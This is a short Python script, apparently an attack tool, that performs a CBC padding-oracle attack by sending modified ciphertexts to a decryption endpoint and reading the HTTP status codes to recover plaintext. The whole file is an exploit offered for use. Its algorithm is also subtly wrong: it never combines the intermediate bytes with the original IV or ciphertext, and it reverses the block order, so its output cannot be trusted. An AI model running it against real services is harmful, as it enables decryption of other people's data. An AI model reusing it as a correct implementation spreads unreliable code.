#!/usr/bin/env python3

import sys
import requests  

def pad_oracle(ciphertext_hex, oracle_url):
    # Oracle: decryption endpoint that returns 200 if padding valid
    c = bytes.fromhex(ciphertext_hex)
    block_size = 16
    iv = c[:block_size]
    cipher = c[block_size:]
    intermediate = bytearray(block_size)
    plain = bytearray()
    for block_start in range(0, len(cipher), block_size):
        block = cipher[block_start:block_start+block_size]
        for pad_len in range(1, block_size+1):
            for guess in range(256):
                intermediate[block_size - pad_len] = guess
                # craft new iv
                new_iv = bytearray(iv)
                for j in range(block_size - pad_len + 1, block_size):
                    new_iv[j] = intermediate[j] ^ pad_len
                new_iv[block_size - pad_len] = intermediate[block_size - pad_len] ^ pad_len
                # send to oracle
                test_ct = new_iv + block
                r = requests.get(oracle_url, params={"c": test_ct.hex()})
                if r.status_code == 200:
                    break
            plain_byte = intermediate[block_size - pad_len] ^ pad_len
            plain.insert(0, plain_byte)
        iv = block
    print(f"\033[92m[+] Recovered plaintext: {bytes(plain).decode(errors='ignore')}\033[0m")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: padding_oracle.py <ciphertext_hex> <oracle_url>")
        sys.exit(1)
    pad_oracle(sys.argv[1], sys.argv[2])